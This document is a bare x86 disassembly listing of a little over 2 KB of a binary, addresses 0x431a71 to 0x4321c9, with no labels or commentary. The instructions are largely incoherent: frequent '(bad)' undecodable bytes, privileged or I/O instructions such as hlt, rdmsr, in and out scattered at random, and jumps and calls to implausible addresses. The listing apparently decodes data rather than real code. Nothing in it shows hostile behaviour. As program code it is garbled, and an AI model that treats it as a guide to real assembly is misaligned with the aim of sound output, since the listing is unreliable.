  431a71:	add    edx,DWORD PTR [edi+0x74]
  431a74:	sbb    BYTE PTR [ebp+0x4d001484],cl
  431a7a:	add    BYTE PTR [ebp-0x74c48bbb],al
  431a80:	je     0x431a05
  431a82:	cmp    eax,edi
  431a84:	js     0x431aa9
  431a86:	add    eax,0xeb0fc003
  431a8b:	jns    0x431a18
  431a8d:	vmread DWORD PTR [ecx+0x45],ebx
  431a91:	add    ecx,DWORD PTR [ebx+0x508d1c74]
  431a97:	adc    al,0x8b
  431a99:	jge    0x431aaf
  431a9b:	mov    edi,DWORD PTR [eax-0x4]
  431a9e:	add    edi,DWORD PTR [edi]
  431aa0:	or     bh,bh
  431aa2:	push   ebp
  431aa3:	push   es
  431aa4:	mov    DWORD PTR [ebp-0x4],ebx
  431aa7:	add    edi,esi
  431aa9:	pop    es
  431aaa:	add    esi,DWORD PTR [edi-0x48ccf183]
  431ab0:	mov    DWORD PTR [esp+esi*8],ecx
  431ab3:	inc    ebp
  431ab4:	pop    ebp
  431ab5:	xor    DWORD PTR [esi-0x4],0x3b
  431ab9:	add    edx,DWORD PTR [ecx+edi*1]
  431abc:	push   es
  431abd:	clc    
  431abe:	mov    bh,0xdb
  431ac0:	jp     0x431a79
  431ac2:	add    cl,BYTE PTR [esi]
  431ac4:	div    DWORD PTR [edi+0x4d8b0c1c]
  431aca:	test   edi,edi
  431acc:	je     0x431ac2
  431ace:	mov    eax,ecx
  431ad0:	or     BYTE PTR [ebx],al
  431ad2:	dec    BYTE PTR [ecx+0x7d3bec7d]
  431ad8:	jbe    0x431b4c
  431ada:	mov    ecx,DWORD PTR [ebx-0x488017f4]
  431ae0:	add    ecx,DWORD PTR [esi]
  431ae2:	cmp    DWORD PTR [edi+0x45fe0cf8],esi
  431ae8:	add    eax,DWORD PTR [ebx-0x287af783]
  431aee:	je     0x431b3d
  431af0:	mov    DWORD PTR [ecx],edi
  431af2:	mov    esi,eax
  431af4:	hlt    
  431af5:	or     BYTE PTR [ecx+0x7dfff4ff],0x5b
  431afc:	jb     0x431abe
  431afe:	jmp    0x431aeb
  431b00:	xor    esi,DWORD PTR [ebx]
  431b02:	pop    edi
  431b03:	pop    esi
  431b04:	pop    ebx
  431b05:	ret    
  431b06:	ret    0x8b
  431b09:	mov    ecx,DWORD PTR [ebx+0x2c008390]
  431b0f:	xor    DWORD PTR [ecx],0xc
  431b12:	pushf  
  431b13:	xor    ecx,DWORD PTR [ecx+0x4539fc56]
  431b19:	rdmsr  
  431b1b:	test   DWORD PTR [eax+eax*1+0xcfc8b8b],ebx
  431b22:	dec    ebp
  431b23:	ret    
  431b24:	mov    edi,DWORD PTR [esi-0x4]
  431b27:	pop    eax
  431b28:	dec    ebp
  431b29:	jne    0x431ab6
  431b2b:	xor    edi,esp
  431b2d:	inc    eax
  431b2e:	dec    ebp
  431b2f:	jbe    0x431b84
  431b31:	inc    eax
  431b32:	pop    ebp
  431b33:	add    edx,DWORD PTR [esi+0x8]
  431b36:	push   esp
  431b37:	dec    eax
  431b38:	push   ecx
  431b39:	mov    eax,edi
  431b3b:	and    al,0xf0
  431b3d:	jo     0x431b2a
  431b3f:	mov    eax,DWORD PTR [ebx]
  431b41:	sbb    BYTE PTR [ebp+0x4d],cl
  431b44:	mov    eax,DWORD PTR [ebx]
  431b46:	nop
  431b47:	or     BYTE PTR [eax],al
  431b49:	jne    0x431ba2
  431b4b:	cmp    ebx,DWORD PTR [ebx+0x33893277]
  431b51:	cld    
  431b52:	xor    edi,edi
  431b54:	add    edi,DWORD PTR [ebp+0x3]
  431b57:	cmp    DWORD PTR [ecx+0xbcfe8fc],ecx
  431b5d:	js     0x431ae3
  431b5f:	jae    0x431b63
  431b61:	(bad)  
  431b63:	xor    al,0x5d
  431b65:	jmp    0x431af2
  431b67:	mov    ecx,DWORD PTR [ecx*4+0x33dfb1de]
  431b6e:	fdecstp 
  431b70:	test   BYTE PTR [edi],ah
  431b72:	add    bh,BYTE PTR [ebp+0x0]
  431b75:	add    ebx,DWORD PTR [ebp-0x77]
  431b78:	mov    edi,eax
  431b7a:	cmp    al,0x0
  431b7d:	adc    dh,BYTE PTR [ebx]
  431b7f:	jge    0x431b84
  431b81:	mov    edi,DWORD PTR [ebx]
  431b83:	jl     0x431b94
  431b85:	clc    
  431b86:	dec    edi
  431b87:	jge    0x431b89
  431b89:	mov    eax,DWORD PTR [ebx]
  431b8b:	jb     0x431b95
  431b8d:	mov    ecx,DWORD PTR [ebp-0x8]
  431b90:	mov    edi,edi
  431b92:	xor    edx,DWORD PTR [eax]
  431b94:	add    edi,DWORD PTR [ebx]
  431b96:	mov    DWORD PTR [ebp-0x10],edi
  431b99:	inc    edi
  431b9a:	pop    ebp
  431b9b:	jge    0x431bd8
  431b9d:	cmp    esi,DWORD PTR [esp+edi*8-0x75]
  431ba1:	mov    edx,0xc05d87f0
  431ba6:	imul   ebx,DWORD PTR [esi+0x14],0xffffffc9
  431baa:	fimul  WORD PTR [eax]
  431bac:	fist   WORD PTR [ebp+0x1c]
  431baf:	in     al,dx
  431bb0:	jne    0x431b9e
  431bb2:	mov    edi,DWORD PTR [edx-0x7a27a10]
  431bb8:	imul   edx,DWORD PTR [ebp+0x14],0xffffffc7
  431bbc:	fdivp  st(0),st
  431bbe:	fild   WORD PTR [ebp+0x4510f85c]
  431bc4:	test   BYTE PTR [ebx+0x4d00fc02],cl
  431bca:	inc    ebp
  431bcb:	mov    ecx,DWORD PTR [ebx+0x454dfcfc]
  431bd1:	mov    ebp,DWORD PTR [ebx-0x4]
  431bd4:	adc    al,0x8b
  431bd6:	rcl    DWORD PTR [eax],0x48
  431bd9:	mov    esi,0x7080803
  431bde:	fiadd  WORD PTR [ebp+0x4d]
  431be1:	(bad)  
  431be2:	mov    edx,DWORD PTR [edx-0x4]
  431be5:	mov    edx,DWORD PTR [ebp-0x4]
  431be8:	xor    ebx,DWORD PTR [ebx+0x330103]
  431bee:	mov    DWORD PTR [edi+0x872dc],edi
  431bf4:	xlat   BYTE PTR ds:[ebx]
  431bf5:	into   
  431bf6:	ffreep st(6)
  431bf8:	retf   0x6c7
  431bfb:	iret   
  431bfc:	dec    ebp
  431bfd:	inc    ebp
  431bfe:	mov    DWORD PTR [ebx],edi
  431c00:	fmul   QWORD PTR [edi]
  431c02:	dec    ebp
  431c03:	jnp    0x431c38
  431c05:	add    BYTE PTR [ebx],al
  431c07:	mov    ecx,DWORD PTR [esp+edi*8]
  431c0a:	inc    ebp
  431c0b:	dec    ebp
  431c0c:	lea    esi,[ebx]
  431c0e:	add    DWORD PTR [ebx],eax
  431c10:	jb     0x431c4d
  431c12:	add    BYTE PTR [edi],cl
  431c14:	inc    ebp
  431c15:	imul   eax,edi,0x858bd800
  431c1b:	cld    
  431c1c:	clc    
  431c1d:	mov    DWORD PTR [ebp+0x0],eax
  431c20:	inc    DWORD PTR [eax]
  431c22:	or     al,0xde
  431c24:	sbb    bh,0x1
  431c27:	retf   
  431c28:	add    BYTE PTR [eax+edx*1+0x33004d02],al
  431c2f:	dec    ebp
  431c30:	add    ecx,DWORD PTR [ecx-0x250b2b77]
  431c36:	enter  0x12de,0xdf
  431c3a:	inc    ebp
  431c3b:	pop    ebp
  431c3c:	dec    DWORD PTR [ebx-0x257f0ff4]
  431c42:	add    DWORD PTR [edx],edx
  431c44:	add    BYTE PTR [ebp+0x50],dl
  431c47:	mov    ecx,DWORD PTR [ecx+0x45d2f4fc]
  431c4d:	xor    ecx,DWORD PTR [edx-0x38c699fd]
  431c53:	or     ah,al
  431c55:	pop    ss
  431c56:	cdq    
  431c57:	push   ebp
  431c58:	clc    
  431c59:	mov    eax,DWORD PTR [ebp-0x4]
  431c5c:	xor    edx,edx
  431c5e:	add    esi,DWORD PTR [ebx]
  431c60:	cmp    eax,DWORD PTR [ebx]
  431c62:	hlt    
  431c63:	cmp    DWORD PTR [ebx],esp
  431c65:	or     al,BYTE PTR [ebp+0xf]
  431c68:	mov    eax,DWORD PTR [edx]
  431c6a:	loopne 0x431c6c
  431c6c:	(bad)  
  431c6d:	mov    ecx,esi
  431c6f:	cld    
  431c70:	pushf  
  431c71:	pop    ebp
  431c72:	fwait
  431c73:	mov    esi,DWORD PTR [edx]
  431c75:	lock mov eax,eax
  431c78:	adc    BYTE PTR [ebx],al
  431c7a:	or     BYTE PTR [ebx+0x4d001001],0xcf
  431c81:	xor    ebp,DWORD PTR [edi+0x50e45189]
  431c87:	dec    ebp
  431c88:	mov    ecx,DWORD PTR [ebx-0x31390304]
  431c8e:	(bad)  
  431c8f:	iret   
  431c90:	inc    ebp
  431c91:	(bad)  
  431c92:	jne    0x431ce1
  431c94:	mov    ecx,DWORD PTR [ebx+0x3c603d8]
  431c9a:	(bad)  
  431c9b:	cmp    ebx,eax
  431c9d:	je     0x431c25
  431c9f:	add    edi,edi
  431ca1:	or     bh,bh
  431ca3:	dec    ebp
  431ca4:	inc    ebp
  431ca5:	mov    esi,DWORD PTR [ebx]
  431ca7:	cld    
  431ca8:	add    ecx,esi
  431caa:	cmp    ecx,DWORD PTR [eax-0xc]
  431cad:	mov    edx,DWORD PTR [edi]
  431caf:	or     BYTE PTR [ebp-0x7c],al
  431cb2:	mov    ebx,DWORD PTR [ebx-0x7639cd18]
  431cb8:	test   BYTE PTR [ebx+ebx*4],cl
  431cbb:	inc    ebp
  431cbc:	xor    bh,BYTE PTR [esi]
  431cbe:	mov    DWORD PTR [eax+ebp*8+0x10ef8b],ebx
  431cc5:	jne    0x431c8e
  431cc7:	mov    ebp,esp
  431cc9:	fcomp  DWORD PTR [ebx]
  431ccb:	add    BYTE PTR [ecx],al
  431ccd:	inc    DWORD PTR [ebp-0x75]
  431cd0:	(bad)  
  431cd1:	cld    
  431cd2:	add    al,0xce
  431cd4:	mov    ecx,edi
  431cd6:	cld    
  431cd7:	inc    ebp
  431cd8:	fidivr WORD PTR [ebx]
  431cda:	fbstp  TBYTE PTR [ebp-0x3e]
  431cdd:	mov    eax,DWORD PTR [eax]
  431cdf:	adc    BYTE PTR [ebx-0x3974038b],cl
  431ce5:	fadd   st,st(7)
  431ce7:	add    BYTE PTR [ebp-0x1],al
  431cea:	mov    ecx,DWORD PTR [esp+edi*8]
  431ced:	inc    ebp
  431cee:	mov    bh,0xc7
  431cf1:	loopne 0x431d38
  431cf3:	sbb    ecx,DWORD PTR [ebx+0x4545fc7f]
  431cf9:	sbb    dh,BYTE PTR [ebx]
  431cfb:	pushf  
  431cfc:	add    ecx,DWORD PTR [ebx-0x398b03c5]
  431d02:	mov    eax,edi
  431d04:	cwde   
  431d05:	inc    ebp
  431d06:	inc    ebp
  431d07:	jne    0x431c94
  431d09:	mov    esp,esp
  431d0b:	clc    
  431d0c:	add    al,0x4d
  431d0e:	mov    DWORD PTR [ebx],esi
  431d10:	or     al,0x33
  431d12:	inc    ebp
  431d13:	lea    ecx,[ebx-0x398d13fd]
  431d19:	add    bh,al
  431d1b:	inc    ebp
  431d1c:	ror    DWORD PTR [ebx+0x45d829],0x8b
  431d23:	add    ebp,esp
  431d25:	shufps xmm1,xmm3,0xc7
  431d29:	(bad)  
  431d2a:	jmp    0x74885853
  431d2f:	xor    ecx,DWORD PTR [ebx+0x453bec03]
  431d35:	hlt    
  431d36:	mov    ecx,DWORD PTR [edi]
  431d38:	fadd   DWORD PTR [ebp+0x0]
  431d3b:	xor    ecx,DWORD PTR [edi]
  431d3d:	add    ecx,ecx
  431d3f:	cmp    edi,edi
  431d41:	pmuludq mm7,QWORD PTR [edx+0x50]
  431d45:	(bad)  
  431d46:	jmp    0x431cd3
  431d48:	mov    edi,esp
  431d4a:	or     al,0xc6
  431d4c:	inc    ebp
  431d4d:	(bad)  
  431d4e:	mov    eax,DWORD PTR [ebp+0x10]
  431d51:	jne    0x431cdc
  431d53:	mov    eax,DWORD PTR [ecx]
  431d55:	clc    
  431d56:	add    BYTE PTR [ebp-0x40],cl
  431d59:	xor    edx,DWORD PTR [eax-0x73]
  431d5c:	jne    0x431d5f
  431d5e:	push   DWORD PTR [edx+0x8]
  431d61:	add    BYTE PTR [ebp+0x45],al
  431d64:	mov    ebp,ecx
  431d66:	cld    
  431d67:	add    BYTE PTR [ebp+0x0],cl
  431d6a:	xor    eax,DWORD PTR [ebp+0x3]
  431d6d:	mov    DWORD PTR [ebx],edi
  431d6f:	adc    cl,BYTE PTR [ebx+0x110cf8c7]
  431d75:	sub    eax,0x5d330e4d
  431d7a:	lea    esi,[ebx]
  431d7c:	add    DWORD PTR [ebx],eax
  431d7e:	jb     0x431d69
  431d80:	add    BYTE PTR [eax],al
  431d82:	inc    ebp
  431d83:	add    bl,ch
  431d85:	inc    ebp
  431d86:	mov    esi,DWORD PTR [ebx]
  431d88:	or     al,0x3
  431d8a:	(bad)  
  431d8b:	mov    edi,eax
  431d8d:	in     al,dx
  431d8e:	scas   eax,DWORD PTR es:[edi]
  431d8f:	inc    ebp
  431d90:	mov    esi,DWORD PTR [ebx]
  431d92:	in     al,0x3
  431d94:	add    al,0x89
  431d96:	mov    ecx,DWORD PTR [eax+edi*8]
  431d99:	dec    ebp
  431d9a:	(bad)  
  431d9b:	mov    ebx,DWORD PTR [esp+ebx*8-0x30cd3165]
  431da2:	mov    ecx,eax
  431da4:	cld    
  431da5:	push   es
  431da6:	dec    ebp
  431da7:	add    al,0x33
  431da9:	mov    DWORD PTR [ebx],eax
  431dab:	in     al,dx
  431dac:	cmp    DWORD PTR [ebp-0x67],eax
  431daf:	mov    eax,DWORD PTR [ebp-0xba0068]
  431db5:	mov    edx,DWORD PTR [ebp-0x4]
  431db8:	mov    ecx,DWORD PTR [ebp-0x2c]
  431dbb:	xor    eax,DWORD PTR [ebp+0x3]
  431dbe:	cmp    DWORD PTR [ebx],0x8b32749a
  431dc4:	xor    edi,esp
  431dc6:	jmp    0xff771b18
  431dcb:	add    ecx,DWORD PTR [ebp-0x3f]
  431dce:	xor    ebx,DWORD PTR [edi]
  431dd0:	add    eax,ecx
  431dd2:	cmp    ebx,DWORD PTR [eax]
  431dd4:	mov    ecx,DWORD PTR [ebp-0x4]
  431dd7:	mov    ecx,DWORD PTR [eax]
  431dd9:	adc    BYTE PTR [ebp-0x80],al
  431ddc:	jmp    0x431ddf
  431dde:	mov    eax,DWORD PTR [eax]
  431de0:	cld    
  431de1:	mov    bh,0xc6
  431de3:	push   ecx
  431de4:	(bad)  
  431de5:	jne    0x431e45
  431de7:	dec    ecx
  431de9:	or     BYTE PTR [ecx+ebx*1],cl
  431dec:	push   ebp
  431ded:	inc    ebp
  431dee:	in     al,dx
  431def:	add    ebp,esp
  431df1:	or     bh,al
  431df3:	dec    ebp
  431df4:	cld    
  431df5:	mov    eax,DWORD PTR [ebp+0x4500f8d8]
  431dfb:	xor    DWORD PTR [edx],0x2
  431dfe:	pushf  
  431dff:	dec    DWORD PTR [ebx+0x45510cf4]
  431e05:	mov    DWORD PTR [ebx+0x5445fc0c],ecx
  431e0b:	mov    edx,DWORD PTR [ecx+0xc]
  431e0e:	xor    eax,esi
  431e10:	mov    edx,0xc172c7
  431e15:	inc    ebp
  431e16:	mov    esi,DWORD PTR [ebp+0x8]
  431e19:	mov    eax,edx
  431e1b:	call   0x84c7e510
  431e20:	add    DWORD PTR [ebx-0x76bace00],ebx
  431e26:	mov    ebp,eax
  431e28:	or     BYTE PTR [eax],dl
  431e2a:	jo     0x431e79
  431e2c:	push   edi
  431e2d:	xor    esi,DWORD PTR [ebp+0x3]
  431e30:	(bad)  
  431e31:	pmulhuw mm0,mm1
  431e34:	test   DWORD PTR [ebp-0x8],ecx
  431e37:	mov    DWORD PTR [ebp-0x67],eax
  431e3a:	mov    eax,DWORD PTR [ebp-0x4]
  431e3d:	xor    edi,DWORD PTR [ebp-0x73]
  431e40:	xor    eax,DWORD PTR [ebx]
  431e42:	xor    esi,DWORD PTR [edx+0x3]
  431e45:	add    BYTE PTR [ecx],bh
  431e47:	inc    ebp
  431e48:	(bad)  
  431e49:	mov    edx,DWORD PTR [ebp-0x7b39fe1c]
  431e4f:	mov    DWORD PTR [eax],0x750f0004
  431e55:	sub    ecx,DWORD PTR [ebx-0x7974f701]
  431e5b:	lock add BYTE PTR [ebp+0x0],cl
  431e5f:	mov    esi,DWORD PTR [ebp-0x18]
  431e62:	mov    ebp,edx
  431e64:	or     al,0x72
  431e66:	ja     0x431e68
  431e68:	mov    edx,esi
  431e6a:	cld    
  431e6b:	(bad)  
  431e6e:	cli    
  431e6f:	mov    esi,DWORD PTR [ebp-0x4]
  431e72:	cmp    ecx,esi
  431e74:	bswap  edi
  431e76:	(bad)
  431e7a:	mov    esi,DWORD PTR [ebp-0x4]
  431e7d:	mov    esi,ecx
  431e7f:	clc    
  431e80:	repnz add esi,DWORD PTR [ebp+0x45]
  431e84:	push   ebx
  431e85:	xor    eax,DWORD PTR [ebp+0x3]
  431e88:	cmp    al,0x5f
  431e8a:	pushf  
  431e8b:	pop    ebx
  431e8c:	jmp    0x431f53
  431e91:	mov    esi,DWORD PTR [ebp-0x7d]
  431e94:	xor    ebp,DWORD PTR [eax]
  431e96:	lea    eax,[ebp-0x8]
  431e99:	xor    edx,esi
  431e9b:	pushf  
  431e9c:	out    dx,eax
  431e9d:	(bad)  
  431e9e:	neg    eax
  431ea0:	ins    DWORD PTR es:[edi],dx
  431ea1:	test   esi,edi
  431ea3:	clc    
  431ea4:	pop    esp
  431ea5:	inc    ebp
  431ea6:	or     BYTE PTR [ecx+0x450f0c7d],cl
  431eac:	xor    edi,DWORD PTR [ecx+0x70f08e6]
  431eb2:	add    cl,al
  431eb4:	jne    0x431e51
  431eb6:	mov    esi,DWORD PTR [edx]
  431eb8:	in     al,dx
  431eb9:	push   esi
  431eba:	xor    BYTE PTR [ebp-0xe],dh
  431ebd:	add    edi,esi
  431ebf:	cmp    esi,DWORD PTR [edi+0xc21c10f]
  431ec5:	add    cl,bh
  431ec7:	mov    edi,DWORD PTR [ebp+0x8]
  431eca:	mov    DWORD PTR [ebp-0x14],esi
  431ecd:	add    esi,DWORD PTR [ebp+0x3c]
  431ed0:	mov    ecx,DWORD PTR [ecx+0x45f10c08]
  431ed6:	mov    ah,0x3e
  431ed8:	fwait
  431ed9:	pushf  
  431eda:	xor    cl,BYTE PTR [ebx+0x75e0e489]
  431ee0:	jne    0x431e6d
  431ee2:	mov    ecx,DWORD PTR [esp+ebp*8]
  431ee5:	icebp  
  431ee6:	icebp  
  431ee7:	shl    edx,0xf2
  431eea:	(bad)  
  431eeb:	mov    ah,0x16
  431eed:	push   eax
  431eee:	jne    0x431e83
  431ef0:	mov    ecx,DWORD PTR [edi]
  431ef2:	in     al,dx
  431ef3:	jmp    0x431ee6
  431ef5:	add    dl,dh
  431ef7:	mov    edi,esi
  431ef9:	or     al,0x8
  431efb:	inc    ebp
  431efc:	jne    0x431f01
  431efe:	mov    esp,DWORD PTR [eax-0x74c1ff24]
  431f04:	ret    
  431f05:	or     bh,bh
  431f07:	jge    0x431ef1
  431f09:	sub    ebx,DWORD PTR [edi+0x17d5d34]
  431f0f:	xor    edi,eax
  431f11:	add    esi,DWORD PTR [ebp-0x77]
  431f14:	mov    ebx,esp
  431f16:	clc    
  431f17:	neg    DWORD PTR [ebp-0x7c]
  431f1a:	xor    eax,DWORD PTR [eax]
  431f1c:	cmp    eax,DWORD PTR [eax]
  431f1e:	repz jne 0x431eb6
  431f21:	xor    eax,DWORD PTR [ecx]
  431f23:	add    ebx,DWORD PTR [eax]
  431f25:	mov    DWORD PTR [ebp-0x8],eax
  431f28:	mov    eax,edi
  431f2a:	cld    
  431f2b:	lock pop eax
  431f2d:	test   DWORD PTR [ebx],esi
  431f2f:	clc    
  431f30:	add    edx,DWORD PTR [edi-0x740bff77]
  431f36:	fdivp  st(4),st
  431f38:	test   ecx,esi
  431f3a:	(bad)  
  431f3b:	jnp    0x431f3c
  431f3d:	add    ecx,DWORD PTR [ebx-0x14c4272f]
  431f43:	jae    0x431ed0
  431f45:	sub    edi,esp
  431f47:	(bad)  
  431f48:	shl    DWORD PTR [eax-0x3e],0x89
  431f4c:	leave  
  431f4d:	call   0x8198d65a
  431f52:	in     al,dx
  431f53:	(bad)  
  431f54:	in     al,dx
  431f55:	add    bh,al
  431f57:	mov    esp,edi
  431f59:	in     al,dx
  431f5a:	test   DWORD PTR [ebp-0x8],edi
  431f5d:	mov    eax,DWORD PTR [ebp+0x2b]
  431f60:	xor    al,BYTE PTR [ebx]
  431f62:	pushf  
  431f63:	jnp    0x57321b9c
  431f69:	xor    edx,DWORD PTR [ecx+ecx*4+0x51]
  431f6d:	loopne 0x431fa2
  431f6f:	jne    0x431f2c
  431f71:	mov    esi,DWORD PTR [edx-0x20]
  431f74:	add    BYTE PTR [ebp-0x3d],bh
  431f77:	xor    eax,DWORD PTR [ebp-0x73]
  431f7a:	mov    edi,DWORD PTR [esi]
  431f7c:	cld    
  431f7d:	jb     0x431f45
  431f7f:	add    bl,al
  431f81:	jne    0x431fc8
  431f83:	mov    edx,DWORD PTR [edi-0x10]
  431f86:	jge    0x432005
  431f88:	mov    esi,DWORD PTR [ebx]
  431f8a:	lock add ecx,DWORD PTR [ebp+0x3b]
  431f8e:	xor    esi,DWORD PTR [ebp-0x77]
  431f91:	mov    esi,eax
  431f93:	lock inc ebp
  431f95:	jge    0x431fc8
  431f97:	xor    ebx,DWORD PTR [ebx+eax*1+0x75f83b8b]
  431f9e:	dec    ebp
  431f9f:	mov    esi,DWORD PTR [ebx]
  431fa1:	loopne 0x431f2c
  431fa3:	jge    0x431f9d
  431fa5:	add    DWORD PTR [ebp-0x7d],eax
  431fa8:	icebp  
  431fa9:	add    bl,BYTE PTR [ebp+ecx*2-0x740b8a75]
  431fb0:	dec    ebp
  431fb1:	hlt    
  431fb2:	xor    ebx,DWORD PTR [ebp-0x77]
  431fb5:	mov    esi,esp
  431fb7:	in     al,0x45
  431fb9:	jge    0x431ff8
  431fbb:	mov    ebx,DWORD PTR [esp+ecx*1-0x43130e75]
  431fc2:	dec    ebp
  431fc3:	push   esp
  431fc4:	xor    edx,DWORD PTR [ebx+0x3ec7389]
  431fca:	inc    ebp
  431fcb:	hlt    
  431fcc:	xor    DWORD PTR [ebp-0x61],esi
  431fcf:	mov    edi,DWORD PTR [eax+0xf19504]
  431fd5:	repnz mov DWORD PTR [ebp+0x20],ebx
  431fd9:	cmp    eax,DWORD PTR [ebp+0xf]
  431fdc:	test   DWORD PTR [edi+ecx*1-0x1],edx
  431fe0:	fistp  WORD PTR [ebx+0x0]
  431fe3:	inc    ebp
  431fe4:	mov    ebx,DWORD PTR [edi+0xc]
  431fe7:	add    eax,eax
  431fe9:	inc    ebp
  431fea:	test   BYTE PTR [ebx],dh
  431fec:	add    eax,DWORD PTR [ebx]
  431fee:	add    BYTE PTR [esi+0x45],bl
  431ff1:	ret    0x85
  431ff4:	jnp    0x5443a3c3
  431ffa:	inc    bp
  431ffc:	inc    ebp
  431ffd:	xor    DWORD PTR [ecx+0xc78a9c],edi
  432003:	fdiv   QWORD PTR [ebx]
  432005:	test   DWORD PTR [ecx+0x453bf8],edi
  43200b:	push   ebx
  43200c:	add    edi,DWORD PTR [esi+0x708088b]
  432012:	cmp    esi,eax
  432014:	setnp  BYTE PTR [ecx-0x74fcffce]
  43201b:	mov    esp,edi
  43201d:	call   0x33ce656f
  432022:	or     BYTE PTR [ebx],al
  432024:	inc    ecx
  432025:	mov    DWORD PTR [ecx+0x408b0ce0],ecx
  43202b:	and    BYTE PTR [ebp-0x7074f0bb],al
  432031:	lock add cl,al
  432034:	mov    DWORD PTR [ebp-0x2c],0xf8f08581
  43203b:	mov    ch,0x45
  43203d:	clc    
  43203e:	xor    eax,DWORD PTR [ebp+0x3]
  432041:	mov    ecx,DWORD PTR [ecx+0x45c1d4f8]
  432047:	inc    ebp
  432048:	mov    eax,DWORD PTR [ecx-0x7aff0770]
  43204e:	mov    edi,eax
  432050:	mov    eax,DWORD PTR [ebp+0x3c]
  432053:	mov    ecx,DWORD PTR [eax]
  432055:	hlt    
  432056:	inc    ebp
  432057:	ror    DWORD PTR [ebx+0x818c45],0xf4
  43205e:	mov    eax,DWORD PTR [ebp+0x45e4f889]
  432064:	push   ebp
  432065:	mov    edi,DWORD PTR [ebx]
  432067:	in     al,dx
  432068:	jne    0x43202b
  43206a:	mov    eax,DWORD PTR [ebp-0x28]
  43206d:	add    DWORD PTR [eax],0xe8058dec
  432073:	clc    
  432074:	mov    esi,DWORD PTR [edi-0x8]
  432077:	add    dh,dl
  432079:	rol    WORD PTR [ebp-0x1],cl
  43207d:	mov    edx,DWORD PTR [eax+0x8]
  432080:	jne    0x432042
  432082:	inc    DWORD PTR [esp+ebx*1-0x74ffb2fd]
  432089:	inc    ebp
  43208a:	push   esp
  43208b:	test   DWORD PTR [ecx+0xf],ecx
  43208e:	sub    edx,esp
  432090:	add    eax,DWORD PTR [eax]
  432092:	and    BYTE PTR [ebx-0x3fc4e7b0],cl
  432098:	add    BYTE PTR [ebx+ecx*4-0x78ffdffd],al
  43209f:	mov    eax,DWORD PTR [ecx]
  4320a1:	and    BYTE PTR [eax],al
  4320a3:	cmp    al,0x10
  4320a5:	add    BYTE PTR [ebp+0x66],al
  4320a8:	inc    ecx
  4320aa:	push   esp
  4320ab:	add    dh,BYTE PTR [ebp+0x0]
  4320ae:	push   edx
  4320af:	enterw 0xc1,0x4d
  4320b4:	mov    esp,DWORD PTR [esi+0x20]
  4320b7:	add    DWORD PTR [ecx-0x7b],eax
  4320ba:	add    eax,DWORD PTR [ebx]
  4320bc:	str    WORD PTR [eax+0x45]
  4320c0:	lea    ecx,[ebx+0x45890801]
  4320c6:	sbb    BYTE PTR [ebx],al
  4320c8:	dec    ebp
  4320c9:	cmp    al,0xf
  4320cb:	inc    ebp
  4320cc:	push   eax
  4320cd:	mov    esi,DWORD PTR [ebx]
  4320cf:	push   eax
  4320d0:	add    eax,eax
  4320d2:	mov    DWORD PTR [esp+ecx*1-0x7bff2efd],eax
  4320d9:	inc    ebp
  4320da:	add    BYTE PTR [ecx],dh
  4320dc:	add    BYTE PTR [ebp+ecx*2+0x3d4338b],cl
  4320e3:	(bad)  
  4320e4:	mov    ebx,eax
  4320e6:	loopne 0x43212d
  4320e8:	dec    ebp
  4320e9:	mov    ecx,DWORD PTR [edi]
  4320eb:	cld    
  4320ec:	push   eax
  4320ed:	xchg   DWORD PTR [ebx],esi
  4320ef:	add    DWORD PTR [ebx],ebp
  4320f1:	add    BYTE PTR [ebx],ch
  4320f3:	or     BYTE PTR [ecx],bh
  4320f5:	dec    ecx
  4320f6:	loopne 0x4320fb
  4320f8:	xchg   DWORD PTR [ebx-0x78ff0400],ecx
  4320fe:	push   ebp
  4320ff:	add    DWORD PTR [ebx+0x55100800],eax
  432105:	dec    ebp
  432106:	jmp    0x432091
  432108:	mov    esp,DWORD PTR [eax]
  43210a:	sbb    dl,dl
  43210c:	inc    eax
  43210d:	xor    ecx,DWORD PTR [ebp+0x4501ff87]
  432113:	add    BYTE PTR [ebx+0x74528555],cl
  432119:	push   ebp
  43211a:	div    DWORD PTR [ebx]
  43211c:	and    eax,DWORD PTR [ebx]
  43211e:	add    edx,DWORD PTR [edx-0x30]
  432121:	jno    0x4320ae
  432123:	inc    DWORD PTR [eax+eiz*1]
  432126:	inc    ebp
  432127:	push   eax
  432128:	push   eax
  432129:	mov    esp,DWORD PTR [edi-0x74beff1c]
  43212f:	mov    edi,esp
  432131:	push   eax
  432132:	inc    ebp
  432133:	enter  0x458b,0x8
  432137:	push   ecx
  432138:	(bad)  
  432139:	call   0x10d2b11
  43213e:	pop    ss
  43213f:	push   ebp
  432140:	mov    ecx,DWORD PTR [ebx+0x489408]
  432146:	mov    ecx,DWORD PTR [ecx+0xc458b04]
  43214c:	push   ecx
  43214d:	jo     0x432137
  43214f:	inc    DWORD PTR [edi]
  432151:	or     BYTE PTR [eax],al
  432153:	call   0xce289d
  432158:	fmul   QWORD PTR [ebp+0x55]
  43215b:	mov    eax,DWORD PTR [ebx-0x313ed7c4]
  432161:	mov    bh,0x8c
  432163:	adc    al,0x9b
  432165:	dec    esp
  432166:	xor    bl,BYTE PTR [eax]
  432168:	mov    ecx,DWORD PTR [ebp+0xc]
  43216b:	mov    eax,DWORD PTR [ebp-0x4]
  43216e:	mov    esi,DWORD PTR [edi-0x3148f924]
  432174:	push   es
  432175:	retf   
  432176:	mov    BYTE PTR [ebp-0x30],0x3b
  43217a:	inc    ebp
  43217b:	movntps XMMWORD PTR [eax-0x741fff77],xmm5
  432182:	retf   0x83fc
  432185:	into   
  432186:	dec    ebp
  432187:	retf   
  432188:	mov    ecx,DWORD PTR [ebp-0x74]
  43218b:	mov    eax,DWORD PTR [eax]
  43218d:	fdiv   QWORD PTR [ebx]
  43218f:	mov    bh,0x3
  432191:	push   es
  432192:	mov    esi,ecx
  432194:	sbb    cl,dl
  432196:	dec    ebp
  432197:	sar    DWORD PTR [ebx],cl
  432199:	push   ebp
  43219a:	jne    0x4321ab
  43219c:	mov    ecx,DWORD PTR [eax-0x74ffff28]
  4321a2:	lea    ebx,[eax]
  4321a4:	call   0xf4ccad6b
  4321a9:	sbb    dh,dl
  4321ab:	add    edx,ebx
  4321ad:	push   ebp
  4321ae:	mov    ecx,DWORD PTR [ebx+0x487238e4]
  4321b4:	push   ecx
  4321b5:	mov    DWORD PTR [eax-0x30],edx
  4321b8:	test   DWORD PTR [edx],eax
  4321ba:	xadd   esp,esi
  4321bd:	pop    es
  4321be:	add    cl,dl
  4321c0:	mov    eax,ecx
  4321c2:	or     al,0x45
  4321c4:	(bad)  
  4321c5:	push   eax
  4321c6:	add    DWORD PTR [edx+0x0],eax
  4321c9:	add    ecx,DWORD PTR [ecx]
